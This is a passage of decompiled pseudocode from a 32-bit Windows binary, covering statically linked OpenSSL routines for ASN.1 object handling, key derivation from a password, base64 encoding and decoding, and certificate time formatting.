        v2 = *((_DWORD *)v10 + 4);
        if ( v2 )
        {
          v3 = *(int (__cdecl **)(_DWORD *, char *))(v2 + 16);
          if ( v3 )
            return (char *)v3(v9, v10);
        }
        else if ( *v10 != 5 && *((_DWORD *)v10 + 1) == 1 )
        {
          result = (char *)*((_DWORD *)v10 + 5);
          *v9 = result;
          return result;
        }
LABEL_20:
        *v9 = 0;
        return result;
      default:
        return result;
    }
  }
}

//----- (0042FA40) --------------------------------------------------------
int __cdecl sub_42FA40(int *a1, int a2)
{
  return sub_42F780(a2, a1, 0);
}

//----- (0042FA60) --------------------------------------------------------
int __cdecl sub_42FA60(int *a1, int *a2)
{
  int *v2; // edi
  int v3; // ebx
  int v4; // edx
  int **v5; // esi
  char *v7; // eax
  int *v8; // eax

  v2 = a2;
  ((void (*)(void))a2[4])();
  v3 = *v2;
  v4 = *v2 & 0x1000;
  if ( v4 )
  {
    a2 = a1;
    v5 = &a2;
  }
  else
  {
    v5 = (int **)a1;
  }
  if ( (v3 & 1) != 0 )
  {
    if ( (v3 & 0x306) != 0 )
    {
      *v5 = 0;
    }
    else
    {
      v7 = (char *)((int (*)(void))v2[4])();
      sub_42F9B0(v5, v7);
    }
    return 1;
  }
  else if ( (v3 & 0x300) != 0 )
  {
    *v5 = 0;
    return 1;
  }
  else if ( (v3 & 6) != 0 )
  {
    v8 = sub_426AF0();
    if ( v8 )
    {
      *v5 = v8;
      return 1;
    }
    else
    {
      sub_408310(13, 133, 65, (int)"crypto\\asn1\\tasn_new.c", 223);
      return 0;
    }
  }
  else
  {
    return sub_42F780(v4);
  }
}
// 42F780: using guessed type _DWORD __cdecl sub_42F780(_DWORD);

//----- (0042FB20) --------------------------------------------------------
int __cdecl sub_42FB20(int a1)
{
  int v1; // eax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = 0;
  v1 = sub_42F780(a1, &v3, 0);
  return v1 <= 0 ? 0 : v3;
}

//----- (0042FB60) --------------------------------------------------------
void __cdecl sub_42FB60(int **a1, int a2)
{
  int v2; // eax
  void (*v3)(void); // eax
  int v4; // eax
  void **v5; // esi

  if ( !a2 )
  {
    v4 = **a1;
    v5 = (void **)(*a1 + 1);
    goto LABEL_9;
  }
  v2 = *(_DWORD *)(a2 + 16);
  if ( v2 )
  {
    v3 = *(void (**)(void))(v2 + 12);
    if ( v3 )
    {
      v3();
      return;
    }
  }
  v5 = (void **)a1;
  if ( *(_BYTE *)a2 == 5 )
  {
    v4 = -1;
    goto LABEL_9;
  }
  v4 = *(_DWORD *)(a2 + 4);
  if ( v4 != 1 )
  {
LABEL_9:
    if ( !*v5 )
      return;
  }
  switch ( v4 )
  {
    case -4:
      sub_42FB60(v5, 0);
      sub_413490(*v5);
      *v5 = 0;
      break;
    case 1:
      if ( a2 )
        *v5 = *(void **)(a2 + 20);
      else
        *v5 = (void *)-1;
      break;
    case 5:
      goto LABEL_17;
    case 6:
      sub_422B70((void **)*v5);
      *v5 = 0;
      break;
    default:
      sub_432A30((void **)*v5);
LABEL_17:
      *v5 = 0;
      break;
  }
}

//----- (0042FC40) --------------------------------------------------------
void __usercall sub_42FC40(int a1@<edi>, int *a2@<esi>, int a3)
{
  int v3; // eax
  void (__cdecl *v4)(int, int *, int, _DWORD); // ebx
  int v5; // eax
  int *v6; // ebp
  int *v7; // eax
  void (__cdecl *v8)(int *, int); // eax
  int v9; // eax
  int v10; // ebp
  int *v11; // eax
  int *v12; // ebx
  int *v13; // eax
  void (__cdecl *v14)(int, int *, int, _DWORD); // [esp+0h] [ebp-8h]
  int v15; // [esp+4h] [ebp-4h]

  v3 = *(_DWORD *)(a1 + 16);
  if ( a2 && (!*(_BYTE *)a1 || *a2) )
  {
    if ( v3 && (v4 = *(void (__cdecl **)(int, int *, int, _DWORD))(v3 + 16)) != 0 )
    {
      v14 = *(void (__cdecl **)(int, int *, int, _DWORD))(v3 + 16);
    }
    else
    {
      v14 = 0;
      v4 = 0;
    }
    switch ( *(_BYTE *)a1 )
    {
      case 0:
        if ( !*(_DWORD *)(a1 + 8) )
          goto LABEL_11;
        sub_42FE30(a2, *(int **)(a1 + 8));
        break;
      case 1:
      case 6:
        if ( !sub_4456F0(a2, -1, a1) && (!v4 || ((int (__cdecl *)(int, int *, int, _DWORD))v4)(2, a2, a1, 0) != 2) )
        {
          sub_4457D0(a2, a1);
          v9 = *(_DWORD *)(a1 + 12);
          v10 = *(_DWORD *)(a1 + 8) + 20 * v9;
          v15 = 0;
          if ( v9 > 0 )
          {
            do
            {
              v10 -= 20;
              v11 = sub_445930(a2, v10, 0);
              v12 = v11;
              if ( v11 )
              {
                v13 = (int *)sub_445920(a2, (int)v11);
                sub_42FE30(v13, v12);
              }
              ++v15;
            }
            while ( v15 < *(_DWORD *)(a1 + 12) );
            v4 = v14;
          }
          if ( v4 )
            v4(3, a2, a1, 0);
          if ( !a3 )
            goto LABEL_35;
        }
        break;
      case 2:
        if ( !v4 || ((int (__cdecl *)(int, int *, int, _DWORD))v4)(2, a2, a1, 0) != 2 )
        {
          v5 = sub_4456B0(a2, a1);
          if ( v5 >= 0 && v5 < *(_DWORD *)(a1 + 12) )
          {
            v6 = (int *)(*(_DWORD *)(a1 + 8) + 20 * v5);
            v7 = (int *)sub_445920(a2, (int)v6);
            sub_42FE30(v7, v6);
          }
          if ( v4 )
            v4(3, a2, a1, 0);
          if ( !a3 )
          {
LABEL_35:
            sub_413490((void *)*a2);
            *a2 = 0;
          }
        }
        break;
      case 4:
        if ( v3 )
        {
          v8 = *(void (__cdecl **)(int *, int))(v3 + 8);
          if ( v8 )
            v8(a2, a1);
        }
        break;
      case 5:
LABEL_11:
        sub_42FB60((int **)a2, a1);
        break;
      default:
        return;
    }
  }
}

//----- (0042FE30) --------------------------------------------------------
void __cdecl sub_42FE30(int *a1, int *a2)
{
  int v2; // eax
  int v3; // edi
  int *v4; // esi
  int *v5; // ebp
  int v6; // ebx
  int *v7; // [esp+8h] [ebp-Ch] BYREF
  int v8; // [esp+Ch] [ebp-8h]
  int v9; // [esp+10h] [ebp-4h]

  v2 = *a2;
  v3 = *a2 & 0x1000;
  v8 = v3;
  if ( v3 )
  {
    v4 = (int *)&v7;
    v7 = a1;
    a1 = (int *)&v7;
  }
  else
  {
    v4 = a1;
  }
  if ( (v2 & 6) != 0 )
  {
    v5 = (int *)*v4;
    v6 = 0;
    if ( sub_426A30(*v4) > 0 )
    {
      while ( 1 )
      {
        v9 = sub_426A40(v5, v6);
        ((void (__cdecl *)(int))a2[4])(v3);
        sub_42FC40();
        if ( ++v6 >= sub_426A30((int)v5) )
          break;
        v3 = v8;
      }
      v4 = a1;
    }
    sub_4269F0((void **)v5);
    *v4 = 0;
  }
  else
  {
    ((void (__cdecl *)(int))a2[4])(v3);
    sub_42FC40();
  }
}
// 42FC40: using guessed type int sub_42FC40(void);

//----- (0042FEF0) --------------------------------------------------------
void __cdecl sub_42FEF0(int a1, int a2)
{
  sub_42FC40(a2, &a1, 0);
}

//----- (0042FF10) --------------------------------------------------------
void __cdecl sub_42FF10(int *a1, int a2)
{
  sub_42FC40(a2, a1, 0);
}

//----- (0042FF30) --------------------------------------------------------
void *__cdecl sub_42FF30(int a1, void *a2)
{
  void *result; // eax
  int v3; // eax
  int v4; // esi
  void *Block; // [esp+0h] [ebp-4h] BYREF

  result = a2;
  Block = 0;
  if ( a2 )
  {
    v3 = sub_42F620((int)a2, &Block, a1);
    if ( Block )
    {
      a2 = Block;
      v4 = sub_42E9C0(0, &a2, v3, a1);
      sub_413490(Block);
      return (void *)v4;
    }
    else
    {
      sub_408310(13, 191, 65, (int)"crypto\\asn1\\a_dup.c", 61);
      return 0;
    }
  }
  return result;
}

//----- (0042FFC0) --------------------------------------------------------
char *sub_42FFC0()
{
  return byte_539040 != 0 ? &byte_539040 : 0;
}
// 539040: using guessed type char byte_539040;

//----- (0042FFE0) --------------------------------------------------------
int __cdecl sub_42FFE0(void *a1, void *a2, int a3, char *a4, int a5)
{
  char *v5; // edi
  int **v6; // esi
  int v8; // eax
  int v9; // eax
  int v10; // edi
  char v11[512]; // [esp+Ch] [ebp-204h] BYREF

  v5 = a4;
  if ( !a4 && byte_539040 )
    v5 = &byte_539040;
  v6 = sub_4460F0();
  if ( !v6 )
    return -1;
  v8 = a3;
  if ( a3 >= 512 )
    v8 = 511;
  sub_445BA0((int)v6, (int)v5, 0, (int)a1, a2, (void *)v8);
  if ( a5 )
  {
    v9 = a3;
    if ( a3 >= 512 )
      v9 = 511;
    sub_445BE0((int)v6, (int)v5, 0, (int)v11, a2, (void *)v9, a1);
  }
  v10 = sub_445C90((int)v6);
  sub_445A60(v6);
  sub_4139E0(v11, 0x200u);
  return v10;
}
// 539040: using guessed type char byte_539040;

//----- (004300E0) --------------------------------------------------------
int __cdecl sub_4300E0(int a1, int *a2, int a3, int a4, int a5, unsigned int a6, int a7, int a8)
{
  int v8; // esi
  int v9; // edi
  int v10; // eax
  int v11; // ebx
  _BYTE **v13; // eax
  _BYTE **v14; // ebp
  int v15; // esi
  int v16; // ecx
  int i; // eax
  char *v18; // esi
  char v19; // dl
  char *v20; // esi
  char v21; // dl
  int v22; // [esp+10h] [ebp-68h] BYREF
  char *v23; // [esp+14h] [ebp-64h]
  char *v24; // [esp+18h] [ebp-60h]
  int *v25; // [esp+1Ch] [ebp-5Ch]
  int v26; // [esp+20h] [ebp-58h]
  int v27; // [esp+24h] [ebp-54h]
  int v28; // [esp+28h] [ebp-50h]
  int v29; // [esp+2Ch] [ebp-4Ch]
  int v30; // [esp+30h] [ebp-48h]
  char v31[64]; // [esp+34h] [ebp-44h] BYREF

  v25 = a2;
  v8 = 0;
  v29 = a1;
  v27 = a3;
  v30 = a4;
  v23 = (char *)a7;
  v24 = (char *)a8;
  v22 = 0;
  v26 = 0;
  v9 = sub_432B60(a1);
  v10 = sub_407400(a1);
  v11 = v10;
  if ( v9 > 64 )
    sub_417C70("assertion failed: nkey <= EVP_MAX_KEY_LENGTH", "crypto\\evp\\evp_key.c", 86);
  if ( v10 > 16 )
    sub_417C70("assertion failed: niv <= EVP_MAX_IV_LENGTH", "crypto\\evp\\evp_key.c", 87);
  if ( !a4 )
    return v9;
  v13 = (_BYTE **)sub_42B820();
  v14 = v13;
  if ( v13 && sub_42B860((int)v13, v25, 0) )
  {
    while ( 1 )
    {
      v28 = v8 + 1;
      if ( v8 )
      {
        if ( !sub_42BA10((int)v14) )
          break;
      }
      if ( !sub_42BA10((int)v14) || v27 && !sub_42BA10((int)v14) || !sub_42BA20(v14, (int)v31, &v22) )
        break;
      v15 = 1;
      if ( a6 > 1 )
      {
        while ( sub_42B860((int)v14, v25, 0) && sub_42BA10((int)v14) && sub_42BA20(v14, (int)v31, &v22) )
        {
          if ( ++v15 >= a6 )
            goto LABEL_22;
        }
        break;
      }
LABEL_22:
      v16 = v22;
      for ( i = 0; v9; ++i )
      {
        if ( i == v16 )
          break;
        if ( v23 )
        {
          v18 = v23;
          v19 = v31[i];
          ++v23;
          *v18 = v19;
        }
        --v9;
      }
      if ( v11 && i != v16 )
      {
        do
        {
          if ( i == v16 )
            break;
          if ( v24 )
          {
            v20 = v24;
            v21 = v31[i];
            ++v24;
            *v20 = v21;
          }
          --v11;
          ++i;
        }
        while ( v11 );
      }
      if ( !v9 && !v11 )
      {
        v26 = sub_432B60(v29);
        break;
      }
      if ( !sub_42B860((int)v14, v25, 0) )
        break;
      v8 = v28;
    }
  }
  sub_42B840(v14);
  sub_4139E0(v31, 0x40u);
  return v26;
}
// 4300E0: using guessed type char var_44[64];

//----- (00430370) --------------------------------------------------------
int __cdecl sub_430370(void *a1)
{
  _DWORD *v1; // eax

  v1 = (_DWORD *)sub_407400((int)a1);
  return sub_424220(v1);
}

//----- (00430390) --------------------------------------------------------
int __cdecl sub_430390(int a1, char *Src, size_t Size)
{
  int *v3; // eax

  v3 = (int *)sub_407400(a1);
  return sub_424010(v3, Src, Size);
}

//----- (004303C0) --------------------------------------------------------
int __cdecl sub_4303C0(int a1, int a2)
{
  int v2; // eax

  v2 = sub_407400(a1);
  return sub_4240F0(a2, v2);
}

//----- (004303E0) --------------------------------------------------------
void *sub_4303E0()
{
  return &unk_5059F0;
}

//----- (004303F0) --------------------------------------------------------
void *sub_4303F0()
{
  return sub_413430(0x60u);
}

//----- (00430410) --------------------------------------------------------
void __cdecl sub_430410(void *Block)
{
  sub_413490(Block);
}

//----- (00430430) --------------------------------------------------------
_DWORD *__cdecl sub_430430(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  a1[1] = 48;
  *a1 = 0;
  a1[22] = 0;
  return result;
}

//----- (00430450) --------------------------------------------------------
int __cdecl sub_430450(_BYTE *a1, unsigned __int8 *a2, int a3)
{
  int v4; // edi
  int i; // ebp
  int v7; // edx
  unsigned int v8; // edx
  _BYTE *v9; // ecx
  _BYTE *v10; // ecx
  unsigned int v11; // edx
  _BYTE *v12; // ecx
  char *v13; // ecx
  char v14; // dl
  int result; // eax

  v4 = a3;
  for ( i = 0; v4 > 0; a2 += 3 )
  {
    v7 = *a2;
    if ( v4 < 3 )
    {
      v11 = v7 << 16;
      if ( v4 == 2 )
        v11 |= a2[1] << 8;
      *a1 = BASE64_table_505A20[(v11 >> 18) & 0x3F];
      v12 = a1 + 1;
      *v12 = BASE64_table_505A20[(v11 >> 12) & 0x3F];
      v13 = v12 + 1;
      if ( v4 == 1 )
        v14 = 61;
      else
        v14 = BASE64_table_505A20[(v11 >> 6) & 0x3F];
      *v13 = v14;
      v10 = v13 + 1;
      *v10 = 61;
    }
    else
    {
      v8 = a2[2] | ((a2[1] | (v7 << 8)) << 8);
      *a1 = BASE64_table_505A20[(v8 >> 18) & 0x3F];
      a1[1] = BASE64_table_505A20[(v8 >> 12) & 0x3F];
      v9 = a1 + 2;
      *v9 = BASE64_table_505A20[(v8 >> 6) & 0x3F];
      v10 = v9 + 1;
      *v10 = BASE64_table_505A20[v8 & 0x3F];
    }
    v4 -= 3;
    a1 = v10 + 1;
    i += 4;
  }
  result = i;
  *a1 = 0;
  return result;
}

//----- (00430540) --------------------------------------------------------
_DWORD *__cdecl sub_430540(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 0;
  a1[1] = 0;
  a1[22] = 0;
  a1[23] = 0;
  return result;
}

//----- (00430560) --------------------------------------------------------
int __cdecl sub_430560(_BYTE *a1, char *a2, int a3)
{
  int v5; // edi
  char v6; // al
  char v7; // al
  unsigned __int8 v10; // al
  char *v11; // esi
  int v12; // ecx
  unsigned __int8 v13; // al
  char *v14; // esi
  int v15; // ebx
  unsigned __int8 v16; // al
  char *v17; // esi
  char v18; // al
  _BYTE *v19; // edx
  int v20; // ecx
  int v21; // [esp+Ch] [ebp-4h]
  int v22; // [esp+1Ch] [ebp+Ch]

  v5 = 0;
  v21 = 0;
  while ( *a2 >= 0 && byte_505A68[(unsigned __int8)*a2] == -32 && a3 > 0 )
  {
    ++a2;
    --a3;
  }
  for ( ; a3 > 3; --a3 )
  {
    v6 = a2[a3 - 1];
    if ( v6 >= 0 )
      v7 = byte_505A68[(unsigned __int8)v6];
    else
      v7 = -1;
    if ( ((unsigned __int8)v7 | 0x13) != 0xF3 )
      break;
  }
  if ( a3 % 4 )
    return -1;
  if ( a3 <= 0 )
    return v21;
  while ( 1 )
  {
    v10 = *a2 >= 0 ? byte_505A68[(unsigned __int8)*a2] : -1;
    v11 = a2 + 1;
    v12 = v10;
    v13 = *v11 >= 0 ? byte_505A68[(unsigned __int8)*v11] : -1;
    v14 = v11 + 1;
    v15 = v13;
    v16 = *v14 >= 0 ? byte_505A68[(unsigned __int8)*v14] : -1;
    v17 = v14 + 1;
    v22 = v16;
    v18 = *v17 >= 0 ? byte_505A68[(unsigned __int8)*v17] : -1;
    a2 = v17 + 1;
    if ( (v12 & 0x80u) != 0 || (v15 & 0x80u) != 0 || (v22 & 0x80u) != 0 || v18 < 0 )
      break;
    v21 += 3;
    v19 = a1 + 1;
    v20 = (unsigned __int8)v18 | ((v22 | ((v15 | (v12 << 6)) << 6)) << 6);
    *(v19 - 1) = BYTE2(v20);
    *v19++ = BYTE1(v20);
    *v19 = v20;
    v5 += 4;
    a1 = v19 + 1;
    if ( v5 >= a3 )
      return v21;
  }
  return -1;
}

//----- (004306B0) --------------------------------------------------------
int __cdecl sub_4306B0(int a1, _BYTE *a2, int *a3)
{
  int v3; // eax

  *a3 = 0;
  if ( *(_DWORD *)a1 )
  {
    v3 = sub_430560(a2, (char *)(a1 + 8), *(_DWORD *)a1);
    if ( v3 < 0 )
      return -1;
    *(_DWORD *)a1 = 0;
    *a3 = v3;
  }
  return 1;
}

//----- (00430700) --------------------------------------------------------
int __cdecl sub_430700(unsigned __int8 *a1, _BYTE *a2, unsigned int *a3, char *Src, int Size)
{
  signed int v5; // ebx
  int v7; // eax
  signed int v8; // esi
  unsigned __int8 *v9; // ebp
  int v10; // eax
  _BYTE *v11; // esi
  int v12; // eax
  int v13; // ecx
  _BYTE *v14; // esi
  unsigned int v15; // [esp+4h] [ebp-4h]

  v5 = Size;
  v15 = 0;
  *a3 = 0;
  if ( Size <= 0 )
    return 0;
  if ( *((int *)a1 + 1) > 80 )
    sub_417C70("assertion failed: ctx->length <= (int)sizeof(ctx->enc_data)", "crypto\\evp\\encode.c", 134);
  v7 = *(_DWORD *)a1;
  v8 = *((_DWORD *)a1 + 1) - *(_DWORD *)a1;
  if ( v8 > Size )
  {
    memcpy(&a1[v7 + 8], Src, Size);
    *(_DWORD *)a1 += Size;
    return 1;
  }
  v9 = (unsigned __int8 *)Src;
  if ( v7 )
  {
    memcpy(&a1[v7 + 8], Src, v8);
    v9 = (unsigned __int8 *)&Src[v8];
    v5 = Size - v8;
    v10 = sub_430450(a2, a1 + 8, *((_DWORD *)a1 + 1));
    *(_DWORD *)a1 = 0;
    a2[v10] = 10;
    v11 = &a2[v10 + 1];
    *v11 = 0;
    v15 = v10 + 1;
  }
  else
  {
    v11 = a2;
  }
  if ( v5 >= *((_DWORD *)a1 + 1) )
  {
    while ( v15 <= 0x7FFFFFFF )
    {
      v12 = sub_430450(v11, v9, *((_DWORD *)a1 + 1));
      v13 = *((_DWORD *)a1 + 1);
      v14 = &v11[v12];
      *v14 = 10;
      v9 += v13;
      v5 -= v13;
      v11 = v14 + 1;
      *v11 = 0;
      v15 += v12 + 1;
      if ( v5 < *((_DWORD *)a1 + 1) )
        goto LABEL_13;
    }
    goto LABEL_14;
  }
LABEL_13:
  if ( v15 > 0x7FFFFFFF )
  {
LABEL_14:
    *a3 = 0;
    return 0;
  }
  if ( v5 )
    memcpy(a1 + 8, v9, v5);
  *(_DWORD *)a1 = v5;
  *a3 = v15;
  return 1;
}

//----- (00430850) --------------------------------------------------------
int __cdecl sub_430850(int a1, _BYTE *a2, int *a3)
{
  int result; // eax
  int v4; // eax

  result = *(_DWORD *)a1;
  if ( *(_DWORD *)a1 )
  {
    v4 = sub_430450(a2, (unsigned __int8 *)(a1 + 8), result);
    a2[v4] = 10;
    result = v4 + 1;
    a2[result] = 0;
    *(_DWORD *)a1 = 0;
    *a3 = result;
  }
  else
  {
    *a3 = 0;
  }
  return result;
}

//----- (00430890) --------------------------------------------------------
int __cdecl sub_430890(int *a1, _BYTE *a2, _DWORD *a3, unsigned __int8 *a4, int a5)
{
  int v5; // ebx
  int v6; // esi
  char *v7; // edi
  int result; // eax
  int v10; // ecx
  unsigned __int8 v11; // al
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // [esp+Ch] [ebp-10h]
  int v16; // [esp+10h] [ebp-Ch]
  int v17; // [esp+14h] [ebp-8h]

  v5 = *a1;
  v6 = 0;
  v7 = (char *)(a1 + 2);
  v16 = 0;
  v15 = 0;
  if ( *a1 > 0 && v7[v5 - 1] == 61 )
  {
    v6 = 1;
    if ( v5 > 1 && v7[v5 - 2] == 61 )
      v6 = 2;
  }
  if ( !a5 )
  {
    *a3 = 0;
    *a1 = v5;
    return 0;
  }
  v17 = 0;
  if ( a5 > 0 )
  {
    do
    {
      v10 = *a4++;
      v11 = (v10 & 0x80u) == 0 ? byte_505A68[(unsigned __int8)v10] : -1;
      if ( v11 == 255 )
        goto LABEL_39;
      if ( v10 == 61 )
      {
        ++v6;
      }
      else if ( v6 > 0 && (v11 | 0x13) != 243 )
      {
        goto LABEL_39;
      }
      if ( v6 > 2 )
        goto LABEL_39;
      if ( v11 == 242 )
      {
        v16 = 1;
        break;
      }
      if ( (v11 | 0x13) != 243 )
      {
        if ( v5 >= 64 )
          goto LABEL_39;
        v7[v5++] = v10;
      }
      if ( v5 == 64 )
      {
        v12 = sub_430560(a2, v7, 64);
        v5 = 0;
        if ( v12 < 0 || v6 > v12 )
          goto LABEL_39;
        v13 = v12 - v6;
        v15 += v13;
        a2 += v13;
      }
    }
    while ( ++v17 < a5 );
  }
  if ( v5 > 0 )
  {
    if ( (v5 & 3) != 0 )
    {
      if ( !v16 )
        goto LABEL_35;
    }
    else
    {
      v14 = sub_430560(a2, v7, v5);
      v5 = 0;
      if ( v14 >= 0 && v6 <= v14 )
      {
        v15 += v14 - v6;
        goto LABEL_34;
      }
    }
LABEL_39:
    result = -1;
    goto LABEL_41;
  }
LABEL_34:
  if ( v16 )
  {
LABEL_40:
    result = 0;
    goto LABEL_41;
  }
LABEL_35:
  if ( !v5 && v6 )
    goto LABEL_40;
  result = 1;
LABEL_41:
  *a3 = v15;
  *a1 = v5;
  return result;
}
// 430972: conditional instruction was optimized away because ebx.4<40

//----- (00430A40) --------------------------------------------------------
int __thiscall sub_430A40(void *this)
{
  int v1; // eax
  int result; // eax
  int *v3; // eax
  int *v4; // [esp+0h] [ebp-74h] BYREF
  int v5[28]; // [esp+4h] [ebp-70h] BYREF

  v4 = v5;
  v5[0] = (int)this;
  if ( dword_539090 )
  {
    v1 = sub_426BE0(dword_539090, (int)v5);
    if ( v1 >= 0 )
      return sub_426A40((int *)dword_539090, v1);
  }
  v3 = (int *)sub_423650((int)&v4, (int)&off_53131C, 13, 4, (int (__cdecl *)(int, int))sub_443940);
  if ( !v3 )
    return 0;
  result = *v3;
  if ( !result )
    return 0;
  return result;
}
// 443940: using guessed type int sub_443940();
// 53131C: using guessed type void *off_53131C;
// 539090: using guessed type int dword_539090;

//----- (00430AB0) --------------------------------------------------------
int __cdecl sub_430AB0(_DWORD *a1, void *a2)
{
  void *v2; // edi
  int i; // esi
  _DWORD *v4; // eax

  v2 = a2;
  for ( i = sub_430A40(a2); i; i = sub_430A40(v2) )
  {
    if ( (*(_BYTE *)(i + 8) & 1) == 0 )
      break;
    v2 = *(void **)(i + 4);
  }
  if ( a1 )
  {
    v4 = sub_4428C0((int)v2);
    if ( v4 )
    {
      *a1 = v4;
      return sub_442AC0((int)v4, (int)v2);
    }
    *a1 = 0;
  }
  return i;
}

//----- (00430B10) --------------------------------------------------------
int __cdecl sub_430B10(volatile LONG **a1, char *String2, volatile LONG *MaxCount)
{
  unsigned int v3; // ebx
  int v4; // esi
  int i; // ebp
  int *v7; // ecx
  int v8; // eax
  int v9; // eax
  int v10; // esi

  v3 = (unsigned int)MaxCount;
  if ( MaxCount == (volatile LONG *)-1 )
    v3 = strlen(String2);
  if ( a1 )
  {
    v4 = sub_442A00((int *)&MaxCount, (int)String2, v3);
    if ( v4 )
    {
      if ( !sub_416200(MaxCount) )
        v4 = 0;
      sub_429F60(MaxCount);
      *a1 = MaxCount;
      return v4;
    }
    *a1 = 0;
  }
  for ( i = 0; ; ++i )
  {
    v7 = (int *)dword_539090;
    v8 = 13;
    if ( dword_539090 )
    {
      v9 = sub_426A30(dword_539090);
      v7 = (int *)dword_539090;
      v8 = v9 + 13;
    }
    if ( i >= v8 )
      break;
    if ( i >= 0 )
    {
      if ( i >= 13 )
        v10 = sub_426A40(v7, i - 13);
      else
        v10 = (int)*(&off_53131C + i);
    }
    else
    {
      v10 = 0;
    }
    if ( (*(_BYTE *)(v10 + 8) & 1) == 0
      && strlen(*(const char **)(v10 + 12)) == v3
      && !_strnicmp(*(const char **)(v10 + 12), String2, v3) )
    {
      return v10;
    }
  }
  return 0;
}
// 53131C: using guessed type void *off_53131C;
// 539090: using guessed type int dword_539090;

//----- (00430C20) --------------------------------------------------------
void __cdecl sub_430C20(void **Block)
{
  if ( Block )
  {
    if ( ((_BYTE)Block[2] & 2) != 0 )
    {
      sub_413490(Block[3]);
      sub_413490(Block[4]);
      sub_413490(Block);
    }
  }
}

//----- (00430C70) --------------------------------------------------------
int __cdecl sub_430C70(unsigned int *a1)
{
  char *v2; // eax
  char *v3; // eax

  if ( !a1 )
    return 0;
  v2 = sub_4233A0(*a1);
  if ( !sub_44B920((int)v2, 2, (int)a1) )
    return 0;
  v3 = sub_423440(*a1);
  return sub_44B920((int)v3, 2, (int)a1);
}

//----- (00430CC0) --------------------------------------------------------
int __cdecl sub_430CC0(unsigned int *a1)
{
  char *v1; // edi
  int result; // eax
  char *v3; // eax
  unsigned int v4; // ecx
  char *v5; // eax
  char *v6; // eax

  v1 = sub_4233A0(*a1);
  if ( !sub_44B920((int)v1, 1, (int)a1) )
    return 0;
  v3 = sub_423440(*a1);
  result = sub_44B920((int)v3, 1, (int)a1);
  if ( !result )
    return 0;
  v4 = a1[1];
  if ( v4 && *a1 != v4 )
  {
    v5 = sub_4233A0(v4);
    if ( sub_44B920((int)v5, 32769, (int)v1) )
    {
      v6 = sub_423440(a1[1]);
      return sub_44B920((int)v6, 32769, (int)v1);
    }
    return 0;
  }
  return result;
}

//----- (00430D50) --------------------------------------------------------
int __cdecl sub_430D50(int a1)
{
  int result; // eax

  result = sub_424FA0(4, 0, 0);
  if ( result )
    return sub_44B870(a1, 2);
  return result;
}

//----- (00430D80) --------------------------------------------------------
int __cdecl sub_430D80(int a1)
{
  int result; // eax

  result = sub_424FA0(8, 0, 0);
  if ( result )
    return sub_44B870(a1, 1);
  return result;
}

//----- (00430DB0) --------------------------------------------------------
void sub_430DB0()
{
  sub_44B7A0(2);
  sub_44B7A0(1);
  sub_44B7A0(-1);
  sub_44BCC0();
  sub_426C00(dword_539278, (void (__cdecl *)(_DWORD))sub_44BB80);
  dword_539278 = 0;
  sub_4269F0((void **)dword_539274);
  dword_539274 = 0;
}
// 44BB80: using guessed type int sub_44BB80();

//----- (00430DE0) --------------------------------------------------------
void *sub_430DE0()
{
  return &unk_505BF8;
}

//----- (00430DF0) --------------------------------------------------------
void *sub_430DF0()
{
  return &unk_505C50;
}

//----- (00430E00) --------------------------------------------------------
void __cdecl sub_430E00(int a1)
{
  sub_42FEF0(a1, (int)&unk_505C50);
}

//----- (00430E20) --------------------------------------------------------
_DWORD *__cdecl sub_430E20(_DWORD *Block, __time64_t Time, int a3, int a4)
{
  struct tm *v4; // eax
  struct tm *v5; // ebx
  _DWORD *result; // eax
  int v7; // esi
  int v8; // edi
  int tm_year; // ebx
  struct tm v10; // [esp+4h] [ebp-24h] BYREF

  v4 = sub_44C950(&Time, &v10);
  v5 = v4;
  if ( v4 )
  {
    v7 = a3;
    v8 = a4;
    if ( !a3 && !a4 || (result = (_DWORD *)sub_44CB90(&v4->tm_sec, a3, a4)) != 0 )
    {
      tm_year = v5->tm_year;
      if ( tm_year < 50 || tm_year >= 150 )
        return sub_44C190(Block, Time, v7, v8);
      else
        return sub_44C6A0(Block, Time, v7, v8);
    }
  }
  else
  {
    sub_408310(13, 217, 173, (int)"crypto\\asn1\\a_time.c", 40);
    return 0;
  }
  return result;
}

//----- (00430EE0) --------------------------------------------------------
BOOL __cdecl sub_430EE0(int *a1)
{
  int v1; // eax

  v1 = a1[1];
  if ( v1 == 24 )
    return sub_44BEC0(0, a1);
  if ( v1 == 23 )
    return sub_44C490(0, a1);
  return 0;
}

//----- (00430F10) --------------------------------------------------------
BOOL __cdecl sub_430F10(int a1, int *a2)
{
  int v2; // eax
  void *v4; // esp
  int v5; // esi
  char *v6; // eax
  int v7; // edx
  char v8; // cl
  int v9; // ecx
  int v10; // edx
  int v11; // ebp
  int v12; // edx
  int v13; // edi
  int v14; // ebx
  char v15; // cl
  char v16; // al
  int v17; // ecx
  const char *v18; // eax
  BOOL v19; // [esp+10h] [ebp-8h]
  int v20; // [esp+20h] [ebp+8h]

  v2 = a2[1];
  if ( v2 == 23 )
  {
    v4 = alloca(8);
    v5 = *a2;
    v6 = (char *)a2[2];
    v7 = 0;
    if ( *a2 >= 10 )
    {
      v19 = v6[v5 - 1] == 90;
      while ( 1 )
      {
        v8 = v6[v7];
        if ( v8 > 57 || v8 < 48 )
          break;
        if ( ++v7 >= 10 )
        {
          v9 = v6[1] + 10 * *v6 - 528;
          v20 = v9;
          if ( v9 < 50 )
            v20 = v9 + 100;
          v10 = v6[3];
          v11 = v10 + 10 * v6[2] - 528;
          if ( (unsigned int)(v10 + 10 * v6[2] - 529) <= 0xB )
          {
            v12 = v6[5] + 10 * v6[4] - 528;
            v13 = v6[7] + 10 * v6[6] - 528;
            v14 = v6[9] + 10 * v6[8] - 528;
            if ( v5 < 12 || (v15 = v6[10], v15 < 48) || v15 > 57 || (v16 = v6[11], v16 < 48) || v16 > 57 )
              v17 = 0;
            else
              v17 = v16 + 10 * v15 - 528;
            v18 = " GMT";
            if ( !v19 )
              v18 = byte_4F1291;
            return sub_419190(
                     a1,
                     "%s %2d %02d:%02d:%02d %d%s",
                     (const char *)dword_5316C8[v11],
                     v12,
                     v13,
                     v14,
                     v17,
                     v20 + 1900,
                     v18) > 0;
          }
          break;
        }
      }
    }
    sub_405110(a1, (int)"Bad time value", 14);
    return 0;
  }
  else if ( v2 == 24 )
  {
    return sub_44C2C0(a1, a2);
  }
  else
  {
    sub_405110(a1, (int)"Bad time value", 14);
    return 0;
  }
}
